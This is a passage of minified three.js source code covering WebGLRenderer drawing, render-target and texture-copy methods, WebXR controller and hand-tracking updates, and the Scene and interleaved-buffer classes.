            this.shadowMap = we, this.getContext = function() { return ge }, this.getContextAttributes = function() { return ge.getContextAttributes() }, this.forceContextLoss = function() {
                const e = V.get("WEBGL_lose_context");
                e && e.loseContext()
            }, this.forceContextRestore = function() {
                const e = V.get("WEBGL_lose_context");
                e && e.restoreContext()
            }, this.getPixelRatio = function() { return R }, this.setPixelRatio = function(e) { void 0 !== e && (R = e, this.setSize(L, A, !1)) }, this.getSize = function(e) { return void 0 === e && (console.warn("WebGLRenderer: .getsize() now requires a Vector2 as an argument"), e = new he), e.set(L, A) }, this.setSize = function(e, n, i) { _e.isPresenting ? console.warn("THREE.WebGLRenderer: Can't change size while VR device is presenting.") : (L = e, A = n, t.width = Math.floor(e * R), t.height = Math.floor(n * R), !1 !== i && (t.style.width = e + "px", t.style.height = n + "px"), this.setViewport(0, 0, e, n)) }, this.getDrawingBufferSize = function(e) { return void 0 === e && (console.warn("WebGLRenderer: .getdrawingBufferSize() now requires a Vector2 as an argument"), e = new he), e.set(L * R, A * R).floor() }, this.setDrawingBufferSize = function(e, n, i) { L = e, A = n, R = i, t.width = Math.floor(e * i), t.height = Math.floor(n * i), this.setViewport(0, 0, e, n) }, this.getCurrentViewport = function(e) { return void 0 === e && (console.warn("WebGLRenderer: .getCurrentViewport() now requires a Vector4 as an argument"), e = new ye), e.copy(T) }, this.getViewport = function(e) { return e.copy(D) }, this.setViewport = function(e, t, n, i) { e.isVector4 ? D.set(e.x, e.y, e.z, e.w) : D.set(e, t, n, i), X.viewport(T.copy(D).multiplyScalar(R).floor()) }, this.getScissor = function(e) { return e.copy(N) }, this.setScissor = function(e, t, n, i) { e.isVector4 ? N.set(e.x, e.y, e.z, e.w) : N.set(e, t, n, i), X.scissor(E.copy(N).multiplyScalar(R).floor()) }, this.getScissorTest = function() { return I }, this.setScissorTest = function(e) { X.setScissorTest(I = e) }, this.setOpaqueSort = function(e) { P = e }, this.setTransparentSort = function(e) { C = e }, this.getClearColor = function(e) { return void 0 === e && (console.warn("WebGLRenderer: .getClearColor() now requires a Color as an argument"), e = new Wt), e.copy(le.getClearColor()) }, this.setClearColor = function() { le.setClearColor.apply(le, arguments) }, this.getClearAlpha = function() { return le.getClearAlpha() }, this.setClearAlpha = function() { le.setClearAlpha.apply(le, arguments) }, this.clear = function(e, t, n) {
                let i = 0;
                (void 0 === e || e) && (i |= 16384), (void 0 === t || t) && (i |= 256), (void 0 === n || n) && (i |= 1024), ge.clear(i)
            }, this.clearColor = function() { this.clear(!0, !1, !1) }, this.clearDepth = function() { this.clear(!1, !0, !1) }, this.clearStencil = function() { this.clear(!1, !1, !0) }, this.dispose = function() { t.removeEventListener("webglcontextlost", Me, !1), t.removeEventListener("webglcontextrestored", Te, !1), ae.dispose(), oe.dispose(), J.dispose(), $.dispose(), ne.dispose(), me.dispose(), _e.dispose(), Ae.stop() }, this.renderBufferImmediate = function(e, t) {
                me.initAttributes();
                const n = J.get(e);
                e.hasPositions && !n.position && (n.position = ge.createBuffer()), e.hasNormals && !n.normal && (n.normal = ge.createBuffer()), e.hasUvs && !n.uv && (n.uv = ge.createBuffer()), e.hasColors && !n.color && (n.color = ge.createBuffer());
                const i = t.getAttributes();
                e.hasPositions && (ge.bindBuffer(34962, n.position), ge.bufferData(34962, e.positionArray, 35048), me.enableAttribute(i.position), ge.vertexAttribPointer(i.position, 3, 5126, !1, 0, 0)), e.hasNormals && (ge.bindBuffer(34962, n.normal), ge.bufferData(34962, e.normalArray, 35048), me.enableAttribute(i.normal), ge.vertexAttribPointer(i.normal, 3, 5126, !1, 0, 0)), e.hasUvs && (ge.bindBuffer(34962, n.uv), ge.bufferData(34962, e.uvArray, 35048), me.enableAttribute(i.uv), ge.vertexAttribPointer(i.uv, 2, 5126, !1, 0, 0)), e.hasColors && (ge.bindBuffer(34962, n.color), ge.bufferData(34962, e.colorArray, 35048), me.enableAttribute(i.color), ge.vertexAttribPointer(i.color, 3, 5126, !1, 0, 0)), me.disableUnusedAttributes(), ge.drawArrays(4, 0, e.count), e.count = 0
            }, this.renderBufferDirect = function(e, t, n, i, r, a) {
                null === t && (t = B);
                const o = r.isMesh && r.matrixWorld.determinant() < 0,
                    s = Ne(e, t, i, r);
                X.setMaterial(i, o);
                let l = n.index;
                const c = n.attributes.position;
                if (null === l) { if (void 0 === c || 0 === c.count) return } else if (0 === l.count) return;
                let u, h = 1;
                !0 === i.wireframe && (l = ee.getWireframeAttribute(n), h = 2), (i.morphTargets || i.morphNormals) && ce.update(r, n, i, s), me.setup(r, i, s, n, l);
                let d = de;
                null !== l && (u = Q.get(l), d = pe, d.setIndex(u));
                const p = null !== l ? l.count : c.count,
                    f = n.drawRange.start * h,
                    m = n.drawRange.count * h,
                    g = null !== a ? a.start * h : 0,
                    v = null !== a ? a.count * h : 1 / 0,
                    y = Math.max(f, g),
                    x = Math.min(p, f + m, g + v) - 1,
                    _ = Math.max(0, x - y + 1);
                if (0 !== _) {
                    if (r.isMesh) !0 === i.wireframe ? (X.setLineWidth(i.wireframeLinewidth * G()), d.setMode(1)) : d.setMode(4);
                    else if (r.isLine) {
                        let e = i.linewidth;
                        void 0 === e && (e = 1), X.setLineWidth(e * G()), r.isLineSegments ? d.setMode(1) : r.isLineLoop ? d.setMode(2) : d.setMode(3)
                    } else r.isPoints ? d.setMode(0) : r.isSprite && d.setMode(4);
                    if (r.isInstancedMesh) d.renderInstances(y, _, r.count);
                    else if (n.isInstancedBufferGeometry) {
                        const e = Math.min(n.instanceCount, n._maxInstanceCount);
                        d.renderInstances(y, _, e)
                    } else d.render(y, _)
                }
            }, this.compile = function(e, t) {
                d = oe.get(e), d.init(), e.traverseVisible((function(e) { e.isLight && e.layers.test(t.layers) && (d.pushLight(e), e.castShadow && d.pushShadow(e)) })), d.setupLights();
                const n = new WeakMap;
                e.traverse((function(t) {
                    const i = t.material;
                    if (i)
                        if (Array.isArray(i))
                            for (let r = 0; r < i.length; r++) { const a = i[r];!1 === n.has(a) && (De(a, e, t), n.set(a)) } else !1 === n.has(i) && (De(i, e, t), n.set(i))
                }))
            };
            let Le = null;
            const Ae = new Zn;

            function Re(e, t, n, i) {
                if (!1 === e.visible) return;
                if (e.layers.test(t.layers))
                    if (e.isGroup) n = e.renderOrder;
                    else if (e.isLOD) !0 === e.autoUpdate && e.update(t);
                else if (e.isLight) d.pushLight(e), e.castShadow && d.pushShadow(e);
                else if (e.isSprite) {
                    if (!e.frustumCulled || O.intersectsSprite(e)) {
                        i && z.setFromMatrixPosition(e.matrixWorld).applyMatrix4(F);
                        const t = ne.update(e),
                            r = e.material;
                        r.visible && h.push(e, t, r, n, z.z, null)
                    }
                } else if (e.isImmediateRenderObject) i && z.setFromMatrixPosition(e.matrixWorld).applyMatrix4(F), h.push(e, null, e.material, n, z.z, null);
                else if ((e.isMesh || e.isLine || e.isPoints) && (e.isSkinnedMesh && e.skeleton.frame !== Y.render.frame && (e.skeleton.update(), e.skeleton.frame = Y.render.frame), !e.frustumCulled || O.intersectsObject(e))) {
                    i && z.setFromMatrixPosition(e.matrixWorld).applyMatrix4(F);
                    const t = ne.update(e),
                        r = e.material;
                    if (Array.isArray(r)) {
                        const i = t.groups;
                        for (let a = 0, o = i.length; a < o; a++) {
                            const o = i[a],
                                s = r[o.materialIndex];
                            s && s.visible && h.push(e, t, s, n, z.z, o)
                        }
                    } else r.visible && h.push(e, t, r, n, z.z, null)
                }
                const r = e.children;
                for (let e = 0, a = r.length; e < a; e++) Re(r[e], t, n, i)
            }

            function Pe(e, t, n) {
                const i = !0 === t.isScene ? t.overrideMaterial : null;
                for (let r = 0, a = e.length; r < a; r++) {
                    const a = e[r],
                        o = a.object,
                        s = a.geometry,
                        l = null === i ? a.material : i,
                        c = a.group;
                    if (n.isArrayCamera) {
                        const e = n.cameras;
                        for (let n = 0, i = e.length; n < i; n++) {
                            const i = e[n];
                            o.layers.test(i.layers) && (X.viewport(T.copy(i.viewport)), d.setupLightsView(i), Ce(o, t, i, s, l, c))
                        }
                    } else Ce(o, t, n, s, l, c)
                }
            }

            function Ce(e, t, n, i, r, a) {
                if (e.onBeforeRender(m, t, n, i, r, a), e.modelViewMatrix.multiplyMatrices(n.matrixWorldInverse, e.matrixWorld), e.normalMatrix.getNormalMatrix(e.modelViewMatrix), e.isImmediateRenderObject) {
                    const i = Ne(n, t, r, e);
                    X.setMaterial(r), me.reset(),
                        function(e, t) { e.render((function(e) { m.renderBufferImmediate(e, t) })) }(e, i)
                } else m.renderBufferDirect(n, t, i, r, e, a);
                e.onAfterRender(m, t, n, i, r, a)
            }

            function De(e, t, n) {
                !0 !== t.isScene && (t = B);
                const i = J.get(e),
                    r = d.state.lights,
                    a = d.state.shadowsArray,
                    o = r.state.version,
                    s = ie.getParameters(e, r.state, a, t, n),
                    l = ie.getProgramCacheKey(s);
                let c = i.program,
                    u = !0;
                if (i.environment = e.isMeshStandardMaterial ? t.environment : null, i.fog = t.fog, i.envMap = $.get(e.envMap || i.environment), void 0 === c) e.addEventListener("dispose", Ee);
                else if (c.cacheKey !== l) Se(e);
                else if (i.lightsStateVersion !== o) u = !1;
                else {
                    if (void 0 !== s.shaderID) return;
                    u = !1
                }
                u && (s.uniforms = ie.getUniforms(e), e.onBeforeCompile(s, m), c = ie.acquireProgram(s, l), i.program = c, i.uniforms = s.uniforms, i.outputEncoding = s.outputEncoding);
                const h = i.uniforms;
                (e.isShaderMaterial || e.isRawShaderMaterial) && !0 !== e.clipping || (i.numClippingPlanes = se.numPlanes, i.numIntersection = se.numIntersection, h.clippingPlanes = se.uniform), i.needsLights = function(e) { return e.isMeshLambertMaterial || e.isMeshToonMaterial || e.isMeshPhongMaterial || e.isMeshStandardMaterial || e.isShadowMaterial || e.isShaderMaterial && !0 === e.lights }(e), i.lightsStateVersion = o, i.needsLights && (h.ambientLightColor.value = r.state.ambient, h.lightProbe.value = r.state.probe, h.directionalLights.value = r.state.directional, h.directionalLightShadows.value = r.state.directionalShadow, h.spotLights.value = r.state.spot, h.spotLightShadows.value = r.state.spotShadow, h.rectAreaLights.value = r.state.rectArea, h.ltc_1.value = r.state.rectAreaLTC1, h.ltc_2.value = r.state.rectAreaLTC2, h.pointLights.value = r.state.point, h.pointLightShadows.value = r.state.pointShadow, h.hemisphereLights.value = r.state.hemi, h.directionalShadowMap.value = r.state.directionalShadowMap, h.directionalShadowMatrix.value = r.state.directionalShadowMatrix, h.spotShadowMap.value = r.state.spotShadowMap, h.spotShadowMatrix.value = r.state.spotShadowMatrix, h.pointShadowMap.value = r.state.pointShadowMap, h.pointShadowMatrix.value = r.state.pointShadowMatrix);
                const p = i.program.getUniforms(),
                    f = hr.seqWithValue(p.seq, h);
                i.uniformsList = f
            }

            function Ne(e, t, n, i) {
                !0 !== t.isScene && (t = B), K.resetTextureUnits();
                const r = t.fog,
                    a = n.isMeshStandardMaterial ? t.environment : null,
                    o = null === _ ? m.outputEncoding : _.texture.encoding,
                    s = $.get(n.envMap || a),
                    l = J.get(n),
                    c = d.state.lights;
                if (!0 === H && (!0 === U || e !== M)) {
                    const t = e === M && n.id === w;
                    se.setState(n, e, t)
                }
                n.version === l.__version ? n.fog && l.fog !== r || l.environment !== a || l.needsLights && l.lightsStateVersion !== c.state.version ? De(n, t, i) : void 0 === l.numClippingPlanes || l.numClippingPlanes === se.numPlanes && l.numIntersection === se.numIntersection ? (l.outputEncoding !== o || l.envMap !== s) && De(n, t, i) : De(n, t, i) : (De(n, t, i), l.__version = n.version);
                let u = !1,
                    h = !1,
                    p = !1;
                const f = l.program,
                    g = f.getUniforms(),
                    v = l.uniforms;
                if (X.useProgram(f.program) && (u = !0, h = !0, p = !0), n.id !== w && (w = n.id, h = !0), u || M !== e) {
                    if (g.setValue(ge, "projectionMatrix", e.projectionMatrix), W.logarithmicDepthBuffer && g.setValue(ge, "logDepthBufFC", 2 / (Math.log(e.far + 1) / Math.LN2)), M !== e && (M = e, h = !0, p = !0), n.isShaderMaterial || n.isMeshPhongMaterial || n.isMeshToonMaterial || n.isMeshStandardMaterial || n.envMap) {
                        const t = g.map.cameraPosition;
                        void 0 !== t && t.setValue(ge, z.setFromMatrixPosition(e.matrixWorld))
                    }(n.isMeshPhongMaterial || n.isMeshToonMaterial || n.isMeshLambertMaterial || n.isMeshBasicMaterial || n.isMeshStandardMaterial || n.isShaderMaterial) && g.setValue(ge, "isOrthographic", !0 === e.isOrthographicCamera), (n.isMeshPhongMaterial || n.isMeshToonMaterial || n.isMeshLambertMaterial || n.isMeshBasicMaterial || n.isMeshStandardMaterial || n.isShaderMaterial || n.isShadowMaterial || n.skinning) && g.setValue(ge, "viewMatrix", e.matrixWorldInverse)
                }
                if (n.skinning) {
                    g.setOptional(ge, i, "bindMatrix"), g.setOptional(ge, i, "bindMatrixInverse");
                    const e = i.skeleton;
                    if (e) {
                        const t = e.bones;
                        if (W.floatVertexTextures) {
                            if (null === e.boneTexture) {
                                let n = Math.sqrt(4 * t.length);
                                n = ue.ceilPowerOfTwo(n), n = Math.max(n, 4);
                                const i = new Float32Array(n * n * 4);
                                i.set(e.boneMatrices);
                                const r = new jn(i, n, n, Z, j);
                                e.boneMatrices = i, e.boneTexture = r, e.boneTextureSize = n
                            }
                            g.setValue(ge, "boneTexture", e.boneTexture, K), g.setValue(ge, "boneTextureSize", e.boneTextureSize)
                        } else g.setOptional(ge, e, "boneMatrices")
                    }
                }
                var y, x;
                return (h || l.receiveShadow !== i.receiveShadow) && (l.receiveShadow = i.receiveShadow, g.setValue(ge, "receiveShadow", i.receiveShadow)), h && (g.setValue(ge, "toneMappingExposure", m.toneMappingExposure), l.needsLights && (x = p, (y = v).ambientLightColor.needsUpdate = x, y.lightProbe.needsUpdate = x, y.directionalLights.needsUpdate = x, y.directionalLightShadows.needsUpdate = x, y.pointLights.needsUpdate = x, y.pointLightShadows.needsUpdate = x, y.spotLights.needsUpdate = x, y.spotLightShadows.needsUpdate = x, y.rectAreaLights.needsUpdate = x, y.hemisphereLights.needsUpdate = x), r && n.fog && re.refreshFogUniforms(v, r), re.refreshMaterialUniforms(v, n, R, A), hr.upload(ge, l.uniformsList, v, K)), n.isShaderMaterial && !0 === n.uniformsNeedUpdate && (hr.upload(ge, l.uniformsList, v, K), n.uniformsNeedUpdate = !1), n.isSpriteMaterial && g.setValue(ge, "center", i.center), g.setValue(ge, "modelViewMatrix", i.modelViewMatrix), g.setValue(ge, "normalMatrix", i.normalMatrix), g.setValue(ge, "modelMatrix", i.matrixWorld), f
            }
            Ae.setAnimationLoop((function(e) { _e.isPresenting || Le && Le(e) })), void 0 !== window && Ae.setContext(window), this.setAnimationLoop = function(e) { Le = e, _e.setAnimationLoop(e), null === e ? Ae.stop() : Ae.start() }, this.render = function(e, t) {
                let n, i;
                if (void 0 !== arguments[2] && (console.warn("THREE.WebGLRenderer.render(): the renderTarget argument has been removed. Use .setRenderTarget() instead."), n = arguments[2]), void 0 !== arguments[3] && (console.warn("THREE.WebGLRenderer.render(): the forceClear argument has been removed. Use .clear() instead."), i = arguments[3]), void 0 !== t && !0 !== t.isCamera) return void console.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.");
                if (!0 === g) return;
                me.resetDefaultState(), w = -1, M = null, !0 === e.autoUpdate && e.updateMatrixWorld(), null === t.parent && t.updateMatrixWorld(), !0 === _e.enabled && !0 === _e.isPresenting && (t = _e.getCamera(t)), !0 === e.isScene && e.onBeforeRender(m, e, t, n || _), d = oe.get(e, f.length), d.init(), f.push(d), F.multiplyMatrices(t.projectionMatrix, t.matrixWorldInverse), O.setFromProjectionMatrix(F), U = this.localClippingEnabled, H = se.init(this.clippingPlanes, U, t), h = ae.get(e, p.length), h.init(), p.push(h), Re(e, t, 0, m.sortObjects), h.finish(), !0 === m.sortObjects && h.sort(P, C), !0 === H && se.beginShadows();
                const r = d.state.shadowsArray;
                we.render(r, e, t), d.setupLights(), d.setupLightsView(t), !0 === H && se.endShadows(), !0 === this.info.autoReset && this.info.reset(), void 0 !== n && this.setRenderTarget(n), le.render(h, e, t, i);
                const a = h.opaque,
                    o = h.transparent;
                a.length > 0 && Pe(a, e, t), o.length > 0 && Pe(o, e, t), !0 === e.isScene && e.onAfterRender(m, e, t), null !== _ && (K.updateRenderTargetMipmap(_), K.updateMultisampleRenderTarget(_)), X.buffers.depth.setTest(!0), X.buffers.depth.setMask(!0), X.buffers.color.setMask(!0), X.setPolygonOffset(!1), f.pop(), d = f.length > 0 ? f[f.length - 1] : null, p.pop(), h = p.length > 0 ? p[p.length - 1] : null
            }, this.setFramebuffer = function(e) { v !== e && null === _ && ge.bindFramebuffer(36160, e), v = e }, this.getActiveCubeFace = function() { return y }, this.getActiveMipmapLevel = function() { return x }, this.getRenderTarget = function() { return _ }, this.setRenderTarget = function(e, t = 0, n = 0) {
                _ = e, y = t, x = n, e && void 0 === J.get(e).__webglFramebuffer && K.setupRenderTarget(e);
                let i = v,
                    r = !1,
                    a = !1;
                if (e) {
                    const n = e.texture;
                    (n.isDataTexture3D || n.isDataTexture2DArray) && (a = !0);
                    const o = J.get(e).__webglFramebuffer;
                    e.isWebGLCubeRenderTarget ? (i = o[t], r = !0) : i = e.isWebGLMultisampleRenderTarget ? J.get(e).__webglMultisampledFramebuffer : o, T.copy(e.viewport), E.copy(e.scissor), S = e.scissorTest
                } else T.copy(D).multiplyScalar(R).floor(), E.copy(N).multiplyScalar(R).floor(), S = I;
                if (b !== i && (ge.bindFramebuffer(36160, i), b = i), X.viewport(T), X.scissor(E), X.setScissorTest(S), r) {
                    const i = J.get(e.texture);
                    ge.framebufferTexture2D(36160, 36064, 34069 + t, i.__webglTexture, n)
                } else if (a) {
                    const i = J.get(e.texture),
                        r = t || 0;
                    ge.framebufferTextureLayer(36160, 36064, i.__webglTexture, n || 0, r)
                }
            }, this.readRenderTargetPixels = function(e, t, n, i, r, a, o) {
                if (!e || !e.isWebGLRenderTarget) return void console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");
                let s = J.get(e).__webglFramebuffer;
                if (e.isWebGLCubeRenderTarget && void 0 !== o && (s = s[o]), s) {
                    let o = !1;
                    s !== b && (ge.bindFramebuffer(36160, s), o = !0);
                    try {
                        const s = e.texture,
                            l = s.format,
                            c = s.type;
                        if (l !== Z && fe.convert(l) !== ge.getParameter(35739)) return void console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");
                        const u = c === q && (V.has("EXT_color_buffer_half_float") || W.isWebGL2 && V.has("EXT_color_buffer_float"));
                        if (!(c === k || fe.convert(c) === ge.getParameter(35738) || c === j && (W.isWebGL2 || V.has("OES_texture_float") || V.has("WEBGL_color_buffer_float")) || u)) return void console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");
                        36053 === ge.checkFramebufferStatus(36160) ? t >= 0 && t <= e.width - i && n >= 0 && n <= e.height - r && ge.readPixels(t, n, i, r, fe.convert(l), fe.convert(c), a) : console.error("THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete.")
                    } finally { o && ge.bindFramebuffer(36160, b) }
                }
            }, this.copyFramebufferToTexture = function(e, t, n = 0) {
                const i = Math.pow(2, -n),
                    r = Math.floor(t.image.width * i),
                    a = Math.floor(t.image.height * i),
                    o = fe.convert(t.format);
                K.setTexture2D(t, 0), ge.copyTexImage2D(3553, n, o, e.x, e.y, r, a, 0), X.unbindTexture()
            }, this.copyTextureToTexture = function(e, t, n, i = 0) {
                const r = t.image.width,
                    a = t.image.height,
                    o = fe.convert(n.format),
                    s = fe.convert(n.type);
                K.setTexture2D(n, 0), ge.pixelStorei(37440, n.flipY), ge.pixelStorei(37441, n.premultiplyAlpha), ge.pixelStorei(3317, n.unpackAlignment), t.isDataTexture ? ge.texSubImage2D(3553, i, e.x, e.y, r, a, o, s, t.image.data) : t.isCompressedTexture ? ge.compressedTexSubImage2D(3553, i, e.x, e.y, t.mipmaps[0].width, t.mipmaps[0].height, o, t.mipmaps[0].data) : ge.texSubImage2D(3553, i, e.x, e.y, o, s, t.image), 0 === i && n.generateMipmaps && ge.generateMipmap(3553), X.unbindTexture()
            }, this.copyTextureToTexture3D = function(e, t, n, i, r = 0) {
                if (m.isWebGL1Renderer) return void console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: can only be used with WebGL2.");
                const { width: a, height: o, data: s } = n.image, l = fe.convert(i.format), c = fe.convert(i.type);
                let u;
                if (i.isDataTexture3D) K.setTexture3D(i, 0), u = 32879;
                else {
                    if (!i.isDataTexture2DArray) return void console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: only supports THREE.DataTexture3D and THREE.DataTexture2DArray.");
                    K.setTexture2DArray(i, 0), u = 35866
                }
                ge.pixelStorei(37440, i.flipY), ge.pixelStorei(37441, i.premultiplyAlpha), ge.pixelStorei(3317, i.unpackAlignment);
                const h = ge.getParameter(3314),
                    d = ge.getParameter(32878),
                    p = ge.getParameter(3316),
                    f = ge.getParameter(3315),
                    g = ge.getParameter(32877);
                ge.pixelStorei(3314, a), ge.pixelStorei(32878, o), ge.pixelStorei(3316, e.min.x), ge.pixelStorei(3315, e.min.y), ge.pixelStorei(32877, e.min.z), ge.texSubImage3D(u, r, t.x, t.y, t.z, e.max.x - e.min.x + 1, e.max.y - e.min.y + 1, e.max.z - e.min.z + 1, l, c, s), ge.pixelStorei(3314, h), ge.pixelStorei(32878, d), ge.pixelStorei(3316, p), ge.pixelStorei(3315, f), ge.pixelStorei(32877, g), 0 === r && i.generateMipmaps && ge.generateMipmap(u), X.unbindTexture()
            }, this.initTexture = function(e) { K.setTexture2D(e, 0), X.unbindTexture() }, this.resetState = function() { X.reset(), me.reset() }, "undefined" != typeof __THREE_DEVTOOLS__ && __THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe", { detail: this }))
        }
        Kr.prototype.isGroup = !0, Object.assign($r.prototype, {
            constructor: $r,
            getHandSpace: function() { return null === this._hand && (this._hand = new Kr, this._hand.matrixAutoUpdate = !1, this._hand.visible = !1, this._hand.joints = {}, this._hand.inputState = { pinching: !1 }), this._hand },
            getTargetRaySpace: function() { return null === this._targetRay && (this._targetRay = new Kr, this._targetRay.matrixAutoUpdate = !1, this._targetRay.visible = !1), this._targetRay },
            getGripSpace: function() { return null === this._grip && (this._grip = new Kr, this._grip.matrixAutoUpdate = !1, this._grip.visible = !1), this._grip },
            dispatchEvent: function(e) { return null !== this._targetRay && this._targetRay.dispatchEvent(e), null !== this._grip && this._grip.dispatchEvent(e), null !== this._hand && this._hand.dispatchEvent(e), this },
            disconnect: function(e) { return this.dispatchEvent({ type: "disconnected", data: e }), null !== this._targetRay && (this._targetRay.visible = !1), null !== this._grip && (this._grip.visible = !1), null !== this._hand && (this._hand.visible = !1), this },
            update: function(e, t, n) {
                let i = null,
                    r = null,
                    a = null;
                const o = this._targetRay,
                    s = this._grip,
                    l = this._hand;
                if (e && "visible-blurred" !== t.session.visibilityState)
                    if (l && e.hand) {
                        a = !0;
                        for (const i of e.hand.values()) {
                            const e = t.getJointPose(i, n);
                            if (void 0 === l.joints[i.jointName]) {
                                const e = new Kr;
                                e.matrixAutoUpdate = !1, e.visible = !1, l.joints[i.jointName] = e, l.add(e)
                            }
                            const r = l.joints[i.jointName];
                            null !== e && (r.matrix.fromArray(e.transform.matrix), r.matrix.decompose(r.position, r.rotation, r.scale), r.jointRadius = e.radius), r.visible = null !== e
                        }
                        const i = l.joints["index-finger-tip"],
                            r = l.joints["thumb-tip"],
                            o = i.position.distanceTo(r.position),
                            s = .02,
                            c = .005;
                        l.inputState.pinching && o > s + c ? (l.inputState.pinching = !1, this.dispatchEvent({ type: "pinchend", handedness: e.handedness, target: this })) : !l.inputState.pinching && o <= s - c && (l.inputState.pinching = !0, this.dispatchEvent({ type: "pinchstart", handedness: e.handedness, target: this }))
                    } else null !== o && (i = t.getPose(e.targetRaySpace, n), null !== i && (o.matrix.fromArray(i.transform.matrix), o.matrix.decompose(o.position, o.rotation, o.scale))), null !== s && e.gripSpace && (r = t.getPose(e.gripSpace, n), null !== r && (s.matrix.fromArray(r.transform.matrix), s.matrix.decompose(s.position, s.rotation, s.scale)));
                return null !== o && (o.visible = null !== i), null !== s && (s.visible = null !== r), null !== l && (l.visible = null !== a), this
            }
        }), Object.assign(Qr.prototype, se.prototype);
        class na extends _t {
            constructor() { super(), this.type = "Scene", this.background = null, this.environment = null, this.fog = null, this.overrideMaterial = null, this.autoUpdate = !0, "undefined" != typeof __THREE_DEVTOOLS__ && __THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe", { detail: this })) }
            copy(e, t) { return super.copy(e, t), null !== e.background && (this.background = e.background.clone()), null !== e.environment && (this.environment = e.environment.clone()), null !== e.fog && (this.fog = e.fog.clone()), null !== e.overrideMaterial && (this.overrideMaterial = e.overrideMaterial.clone()), this.autoUpdate = e.autoUpdate, this.matrixAutoUpdate = e.matrixAutoUpdate, this }
            toJSON(e) { const t = super.toJSON(e); return null !== this.background && (t.object.background = this.background.toJSON(e)), null !== this.environment && (t.object.environment = this.environment.toJSON(e)), null !== this.fog && (t.object.fog = this.fog.toJSON()), t }
        }

        function ia(e, t) { this.array = e, this.stride = t, this.count = void 0 !== e ? e.length / t : 0, this.usage = re, this.updateRange = { offset: 0, count: -1 }, this.version = 0, this.uuid = ue.generateUUID() }
        na.prototype.isScene = !0, Object.defineProperty(ia.prototype, "needsUpdate", { set: function(e) {!0 === e && this.version++ } }), Object.assign(ia.prototype, { isInterleavedBuffer: !0, onUploadCallback: function() {}, setUsage: function(e) { return this.usage = e, this }, copy: function(e) { return this.array = new e.array.constructor(e.array), this.count = e.count, this.stride = e.stride, this.usage = e.usage, this }, copyAt: function(e, t, n) { e *= this.stride, n *= t.stride; for (let i = 0, r = this.stride; i < r; i++) this.array[e + i] = t.array[n + i]; return this }, set: function(e, t = 0) { return this.array.set(e, t), this }, clone: function(e) { void 0 === e.arrayBuffers && (e.arrayBuffers = {}), void 0 === this.array.buffer._uuid && (this.array.buffer._uuid = ue.generateUUID()), void 0 === e.arrayBuffers[this.array.buffer._uuid] && (e.arrayBuffers[this.array.buffer._uuid] = this.array.slice(0).buffer); const t = new ia(new this.array.constructor(e.arrayBuffers[this.array.buffer._uuid]), this.stride); return t.setUsage(this.usage), t }, onUpload: function(e) { return this.onUploadCallback = e, this }, toJSON: function(e) { return void 0 === e.arrayBuffers && (e.arrayBuffers = {}), void 0 === this.array.buffer._uuid && (this.array.buffer._uuid = ue.generateUUID()), void 0 === e.arrayBuffers[this.array.buffer._uuid] && (e.arrayBuffers[this.array.buffer._uuid] = Array.prototype.slice.call(new Uint32Array(this.array.buffer))), { uuid: this.uuid, buffer: this.array.buffer._uuid, type: this.array.constructor.name, stride: this.stride } } });
        const ra = new be;

        function aa(e, t, n, i) { this.name = "", this.data = e, this.itemSize = t, this.offset = n, this.normalized = !0 === i }
        Object.defineProperties(aa.prototype, { count: { get: function() { return this.data.count } }, array: { get: function() { return this.data.array } }, needsUpdate: { set: function(e) { this.data.needsUpdate = e } } }), Object.assign(aa.prototype, { isInterleavedBufferAttribute: !0, applyMatrix4: function(e) { for (let t = 0, n = this.data.count; t < n; t++) ra.x = this.getX(t), ra.y = this.getY(t), ra.z = this.getZ(t), ra.applyMatrix4(e), this.setXYZ(t, ra.x, ra.y, ra.z); return this }, setX: function(e, t) { return this.data.array[e * this.data.stride + this.offset] = t, this }, setY: function(e, t) { return this.data.array[e * this.data.stride + this.offset + 1] = t, this }, setZ: function(e, t) { return this.data.array[e * this.data.stride + this.offset + 2] = t, this }, setW: function(e, t) { return this.data.array[e * this.data.stride + this.offset + 3] = t, this }, getX: function(e) { return this.data.array[e * this.data.stride + this.offset] }, getY: function(e) { return this.data.array[e * this.data.stride + this.offset + 1] }, getZ: function(e) { return this.data.array[e * this.data.stride + this.offset + 2] }, getW: function(e) { return this.data.array[e * this.data.stride + this.offset + 3] }, setXY: function(e, t, n) { return e = e * this.data.stride + this.offset, this.data.array[e + 0] = t, this.data.array[e + 1] = n, this }, setXYZ: function(e, t, n, i) { return e = e * this.data.stride + this.offset, this.data.array[e + 0] = t, this.data.array[e + 1] = n, this.data.array[e + 2] = i, this }, setXYZW: function(e, t, n, i, r) { return e = e * this.data.stride + this.offset, this.data.array[e + 0] = t, this.data.array[e + 1] = n, this.data.array[e + 2] = i, this.data.array[e + 3] = r, this }, clone: function(e) { if (void 0 === e) { console.log("THREE.InterleavedBufferAttribute.clone(): Cloning an interlaved buffer attribute will deinterleave buffer data."); const e = []; for (let t = 0; t < this.count; t++) { const n = t * this.data.stride + this.offset; for (let t = 0; t < this.itemSize; t++) e.push(this.data.array[n + t]) } return new Yt(new this.array.constructor(e), this.itemSize, this.normalized) } return void 0 === e.interleavedBuffers && (e.interleavedBuffers = {}), void 0 === e.interleavedBuffers[this.data.uuid] && (e.interleavedBuffers[this.data.uuid] = this.data.clone(e)), new aa(e.interleavedBuffers[this.data.uuid], this.itemSize, this.offset, this.normalized) }, toJSON: function(e) { if (void 0 === e) { console.log("THREE.InterleavedBufferAttribute.toJSON(): Serializing an interlaved buffer attribute will deinterleave buffer data."); const e = []; for (let t = 0; t < this.count; t++) { const n = t * this.data.stride + this.offset; for (let t = 0; t < this.itemSize; t++) e.push(this.data.array[n + t]) } return { itemSize: this.itemSize, type: this.array.constructor.name, array: e, normalized: this.normalized } } return void 0 === e.interleavedBuffers && (e.interleavedBuffers = {}), void 0 === e.interleavedBuffers[this.data.uuid] && (e.interleavedBuffers[this.data.uuid] = this.data.toJSON(e)), { isInterleavedBufferAttribute: !0, itemSize: this.itemSize, data: this.data.uuid, offset: this.offset, normalized: 